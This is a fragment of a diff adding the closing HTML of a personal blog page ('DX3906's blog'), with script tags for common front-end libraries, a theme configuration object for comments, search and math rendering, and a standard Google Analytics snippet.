+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":70},"comment":{"giscus":{"category":"General","categoryId":"DIC_kwDOIfJDVM4CTZ0v","darkTheme":"dark","emitMetadata":"0","inputPosition":"bottom","lang":"zh-CN","lazyLoading":false,"lightTheme":"light","mapping":"pathname","reactionsEnabled":"1","repo":"DX39061/DX39061.github.io","repoId":"R_kgDOIfJDVA"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"DX3906's blog","id-2":"DX3906's blog"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":true,"left":"$$","right":"$$"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"},{"display":false,"left":"$","right":"$"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-PDDZEGMRFE', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-PDDZEGMRFE" async></script></body>
+</html>
